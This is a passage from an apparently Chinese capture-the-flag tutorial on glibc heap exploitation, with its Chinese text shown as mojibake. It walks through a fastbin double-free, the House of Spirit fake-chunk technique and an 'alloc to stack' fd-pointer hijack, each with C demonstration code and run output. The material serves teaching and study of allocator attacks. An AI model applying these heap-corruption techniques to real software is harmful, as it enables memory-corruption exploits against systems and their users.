<code>fd</code> æŒ‡é’ˆæŒ‡å‘ <code>ptr0</code> çš„åœ°å€ï¼ŒåŒæ—¶ <code>ptr0</code> çš„ <code>fd</code> æŒ‡é’ˆä¹ŸæŒ‡å‘ <code>ptr1</code> çš„åœ°å€</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A841.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨41.png"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åˆ†é…ä¸‰ä¸ªæ–°å†…å­˜å—ï¼Œå¤§å°ä¸æˆ‘ä»¬é‡Šæ”¾çš„å†…å­˜å—ç›¸åŒ</p><p>æ‰§è¡Œå®Œ <code>ptr3 = malloc(0x30)</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A843.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨43.png"></p><p>æ‰§è¡Œå®Œ <code>ptr4 = malloc(0x30)</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A844.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨44.png"></p><p>æ‰§è¡Œå®Œ <code>ptr5 = malloc(0x30)</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A845.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨45.png"></p><p>å‘å®ƒä»¬å†™å…¥ <code>data0</code>ã€<code>data1</code>ã€<code>data2</code> çš„æ•°æ®ï¼Œè¿™å°†ä½¿æˆ‘ä»¬å¾—åˆ°ä¹‹å‰é‡Šæ”¾çš„ä¸‰ä¸ªå†…å­˜å—</p><p>æ‰§è¡Œå®Œ <code>memcpy(ptr3, data0, 0x8)</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A846.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨46.png"></p><p>æ‰§è¡Œå®Œ <code>memcpy(ptr4, data1, 0x8)</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A847.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨47.png"></p><p>æ‰§è¡Œå®Œ <code>memcpy(ptr5, data2, 0x8)</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A848.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨48.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå‘ <code>ptr5</code> ä¸­å†™å…¥çš„æ•°æ®å®é™…å†™å…¥åˆ°äº† <code>chunk4</code> ä¸­</p><p>æ­¤æ—¶è¾“å‡ºä¿¡æ¯ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk4<span class="token operator">:</span> ptr3 @ <span class="token number">0x602010</span>	 contains<span class="token operator">:</span> <span class="token number">22222222</span>
Chunk5<span class="token operator">:</span> ptr4 @ <span class="token number">0x602050</span>	 contains<span class="token operator">:</span> <span class="token number">11111111</span>
Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span>	 contains<span class="token operator">:</span> <span class="token number">22222222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>åˆ°è¿™é‡Œå¯ä»¥å‘ç°ï¼Œ<strong>ç”±äºå‰é¢ä¸¤æ¬¡é‡Šæ”¾äº†åŒä¸€ä¸ªæŒ‡é’ˆï¼Œç°åœ¨æˆ‘ä»¬åˆ†é…åˆ°äº†ç›¸åŒçš„æŒ‡é’ˆ</strong>ï¼ˆå› ä¸º <code>malloc</code> ä¼šå‡ºäºæ€§èƒ½æå‡çš„åŸå› é‡ç”¨ç›¸ä¼¼å¤§å°çš„å·²é‡Šæ”¾å†…å­˜å—ï¼‰</p></blockquote><p><em>ç°åœ¨æˆ‘ä»¬å¯ä»¥é‡Šæ”¾æŒ‡å‘ <code>chunk4</code> æˆ– <code>chunk6</code> çš„å…¶ä¸­ä¸€ä¸ªæŒ‡é’ˆï¼ˆå³ï¼š<code>ptr3</code> æˆ– <code>ptr5</code>ï¼‰ï¼Œå¹¶æ¸…é™¤è¯¥æŒ‡é’ˆï¼ˆé˜²æ­¢ä½¿ç”¨é‡Šæ”¾åçš„æŒ‡é’ˆï¼‰ï¼Œè€Œæˆ‘ä»¬ä»ç„¶ä¼šæœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå†…å­˜å—ï¼Œè€Œè¯¥å†…å­˜å—ç°åœ¨å·²è¢«é‡Šæ”¾</em></p><p><mark>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ double free æ¥ç¼–è¾‘å·²é‡Šæ”¾çš„å†…å­˜å—</mark></p><p>æ‰§è¡Œ <code>free(ptr3)</code> å¹¶å°† <code>ptr3</code> ç½®ä¸º NULL åï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A849.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨49.png"></p><p>æ­¤æ—¶è¾“å‡ºä¿¡æ¯ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk4<span class="token operator">:</span> ptr3 @ <span class="token punctuation">(</span>nil<span class="token punctuation">)</span>
Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é€šè¿‡ <code>memcpy(ptr5, data3, 0x8)</code> å‘ <code>ptr5</code> å†™å…¥æ•°æ®æ—¶ï¼Œ<strong>ä¼šå°†æ•°æ®å†™å…¥åˆ°å·²ç»è¢«é‡Šæ”¾çš„ <code>chunk4</code> ä¸­</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A850.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨50.png"></p><p>æ­¤æ—¶è¾“å‡ºä¿¡æ¯ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span>	 contains<span class="token operator">:</span> <span class="token number">15935728</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><blockquote><p>House of Spirit æ˜¯&nbsp;the Malloc Maleficarum&nbsp;ä¸­çš„ä¸€ç§æŠ€æœ¯ï¼Œå…¶æ ¸å¿ƒåœ¨äºï¼š<strong>åœ¨ç›®æ ‡ä½ç½®å¤„ä¼ªé€  <code>fast bin chunk</code>ï¼Œå¹¶å°†å…¶é‡Šæ”¾ï¼Œä»è€Œå®ç°åˆ†é…æŒ‡å®šåœ°å€çš„ <code>chunk</code></strong></p></blockquote><p>è¦æƒ³æ„é€  <code>fast bin fake chunk</code> å¹¶ä¸”å°†å…¶é‡Šæ”¾æ—¶ï¼Œå¯ä»¥å°†å…¶æ”¾å…¥åˆ°å¯¹åº”çš„ <code>fast bin</code> é“¾è¡¨ä¸­ï¼Œä½†éœ€è¦ç»•è¿‡ä¸€äº›å¿…è¦çš„æ£€æµ‹ï¼š</p><ul><li><code>fake chunk</code> çš„ <code>ISMMAP</code> ä½ä¸èƒ½ä¸º 1ï¼Œå› ä¸º <code>free</code> æ—¶ï¼Œå¦‚æœæ˜¯ <code>mmap</code> çš„ <code>chunk</code>ï¼Œä¼šå•ç‹¬å¤„ç†</li><li><code>fake chunk</code> åœ°å€éœ€è¦å¯¹é½ï¼Œ<code>MALLOC_ALIGN_MASK</code></li><li><code>fake chunk</code> çš„ <code>size</code> å¤§å°éœ€è¦æ»¡è¶³å¯¹åº”çš„ <code>fast bin</code> çš„éœ€æ±‚ï¼ŒåŒæ—¶ä¹Ÿå¾—å¯¹é½</li><li><code>fake chunk</code> çš„ <code>next chunk</code> çš„å¤§å°ä¸èƒ½å°äº&nbsp;<code>2 * SIZE_SZ</code>ï¼ŒåŒæ—¶ä¹Ÿä¸èƒ½å¤§äº<code>av-&gt;system_mem</code></li><li><code>fake chunk</code> å¯¹åº”çš„ <code>fast bin</code> é“¾è¡¨å¤´éƒ¨ä¸èƒ½æ˜¯è¯¥ <code>fake chunk</code>ï¼Œå³ä¸èƒ½æ„æˆ <code>double free</code> çš„æƒ…å†µ</li></ul><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates the house of spirit attack.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Calling malloc() once so that it sets up its memory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>
    <span class="token comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_chunks<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment">// this is the size</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>
    fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span> <span class="token comment">// nextsize</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the overwritten pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(0x30): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œç»“æœï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">This file demonstrates the house of spirit attack<span class="token punctuation">.</span>
Calling <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> once so that it sets up its memory<span class="token punctuation">.</span>
We will now overwrite a pointer to point to a fake <span class="token char">'fastbin'</span> region<span class="token punctuation">.</span>
This <span class="token function">region</span> <span class="token punctuation">(</span>memory of length<span class="token operator">:</span> <span class="token number">80</span><span class="token punctuation">)</span> contains two chunks<span class="token punctuation">.</span> The first starts at <span class="token number">0x7ffc9e07e6d8</span> <span class="token operator">and</span> the second at <span class="token number">0x7ffc9e07e708.</span>
This chunk<span class="token punctuation">.</span>size of <span class="token keyword">this</span> region has to be <span class="token number">16</span> more than the <span class="token function">region</span> <span class="token punctuation">(</span>to accomodate the chunk data<span class="token punctuation">)</span> <span class="token keyword">while</span> still falling into the fastbin <span class="token function">category</span> <span class="token punctuation">(</span><span class="token operator">&lt;=</span> <span class="token number">128</span> on x64<span class="token punctuation">)</span><span class="token punctuation">.</span> The <span class="token function">PREV_INUSE</span> <span class="token punctuation">(</span>lsb<span class="token punctuation">)</span> bit is ignored by free <span class="token keyword">for</span> fastbin<span class="token operator">-</span>sized chunks<span class="token punctuation">,</span> however the <span class="token function">IS_MMAPPED</span> <span class="token punctuation">(</span>second lsb<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token function">NON_MAIN_ARENA</span> <span class="token punctuation">(</span>third lsb<span class="token punctuation">)</span> bits cause problems<span class="token punctuation">.</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> note that <span class="token keyword">this</span> has to be the size of the next malloc request rounded to the internal size used by the malloc implementation<span class="token punctuation">.</span> E<span class="token punctuation">.</span>g<span class="token punctuation">.</span> on x64<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x38</span> will all be rounded to <span class="token number">0x40</span><span class="token punctuation">,</span> so they would work <span class="token keyword">for</span> the malloc parameter at the end<span class="token punctuation">.</span> 
The chunk<span class="token punctuation">.</span>size of the <span class="token operator">*</span>next<span class="token operator">*</span> fake region has to be sane<span class="token punctuation">.</span> That is <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token operator">*</span><span class="token function">SIZE_SZ</span> <span class="token punctuation">(</span><span class="token operator">&gt;</span> <span class="token number">16</span> on x64<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">&lt;</span> av<span class="token operator">-&gt;</span><span class="token function">system_mem</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span> <span class="token number">128</span>kb by <span class="token keyword">default</span> <span class="token keyword">for</span> the main arena<span class="token punctuation">)</span> to pass the nextsize integrity checks<span class="token punctuation">.</span> No need <span class="token keyword">for</span> fastbin size<span class="token punctuation">.</span>
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk<span class="token punctuation">,</span> <span class="token number">0x7ffc9e07e6d8.</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> note that the memory address of the <span class="token operator">*</span>region<span class="token operator">*</span> associated with <span class="token keyword">this</span> chunk must be <span class="token number">16</span><span class="token operator">-</span>byte aligned<span class="token punctuation">.</span>
Freeing the overwritten pointer<span class="token punctuation">.</span>
Now the next malloc will <span class="token keyword">return</span> the region of our fake chunk at <span class="token number">0x7ffc9e07e6d8</span><span class="token punctuation">,</span> which will be <span class="token number">0x7ffc9e07e6e0</span><span class="token operator">!</span>
<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">0x7ffc9e07e6e0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æƒ³è¦ä½¿ç”¨ House Of Spirit çš„æŠ€æœ¯åˆ†é… <code>chunk</code> åˆ°æŒ‡å®šåœ°å€ï¼Œå…¶å®å¹¶ä¸éœ€è¦ä¿®æ”¹æŒ‡å®šåœ°å€çš„ä»»ä½•å†…å®¹ï¼Œ<strong>å…³é”®æ˜¯è¦èƒ½å¤Ÿä¿®æ”¹æŒ‡å®šåœ°å€çš„å‰åçš„å†…å®¹ä½¿å…¶å¯ä»¥ç»•è¿‡å¯¹åº”çš„æ£€æµ‹</strong></p></blockquote><hr><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><blockquote><p>è¯¥æŠ€æœ¯çš„æ ¸å¿ƒç‚¹åœ¨äºåŠ«æŒ <code>fast bin</code> é“¾è¡¨ä¸­ <code>chunk</code> çš„ <code>fd</code> æŒ‡é’ˆï¼Œ<strong>æŠŠ <code>fd</code> æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æƒ³è¦åˆ†é…çš„æ ˆä¸Šï¼Œä»è€Œå®ç°æ§åˆ¶æ ˆä¸­çš„ä¸€äº›å…³é”®æ•°æ®</strong>ï¼Œæ¯”å¦‚ï¼šè¿”å›åœ°å€ç­‰ï¼Œéœ€è¦æ ˆä¸Šå­˜åœ¨æœ‰æ»¡è¶³æ¡ä»¶çš„ <code>size</code> å€¼</p></blockquote><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_chunk</span>
<span class="token punctuation">{</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> pre_size<span class="token punctuation">;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> fd<span class="token punctuation">;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> bk<span class="token punctuation">;</span>
<span class="token punctuation">}</span> CHUNK<span class="token punctuation">,</span> <span class="token operator">*</span>PCHUNK<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    CHUNK stack_chunk<span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>

    stack_chunk<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x21</span><span class="token punctuation">;</span>
    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> chunk1 <span class="token operator">=</span> <span class="token operator">&amp;</span>stack_chunk<span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk_a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™æ¬¡æˆ‘ä»¬æŠŠ <code>fake_chunk</code> ç½®äºæ ˆä¸­ç§°ä¸º <code>stack_chunk</code></p><p>åŒæ—¶åŠ«æŒäº† <code>fast bin</code> é“¾è¡¨ä¸­ <code>chunk</code> çš„ <code>fd</code> å€¼ï¼Œé€šè¿‡æŠŠè¿™ä¸ª <code>fd</code> å€¼æŒ‡å‘ <code>stack_chunk</code> å°±å¯ä»¥å®ç°åœ¨æ ˆä¸­åˆ†é… <code>fast bin chunk</code></p></blockquote><p>æ‰§è¡Œ <code>*(long long *)chunk1=&amp;stack_chunk</code> åï¼Œ<code>chunk1</code> çš„ <code>fd</code> æŒ‡é’ˆæŒ‡å‘äº† <code>stack_chunk</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A852.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨52.png"></p><p>ç¬¬ä¸€æ¬¡æ‰§è¡Œ&nbsp;<code>malloc</code> ä½¿å¾— <code>fast bin</code> é“¾è¡¨æŒ‡å‘äº† <code>stack_chunk</code>ï¼Œè¿™æ„å‘³ç€ä¸‹ä¸€æ¬¡åˆ†é…ä¼šä½¿ç”¨ <code>stack_chunk</code> çš„å†…å­˜è¿›è¡Œï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A853.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨53.png"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬äºŒæ¬¡æ‰§è¡Œ <code>malloc</code> çš„è¿”å›å€¼ RAX ä¸º 0x7fffffffdc80ï¼Œä¹Ÿå°±æ˜¯ <code>stack_chunk</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A854.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨54.png"></p><p><code>stack_chunk</code> çš„åœ°å€åœ¨æ ˆä¸Šï¼Œè€Œä¸åœ¨å †ä¸Šï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A855.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨55.png"></p><p><img 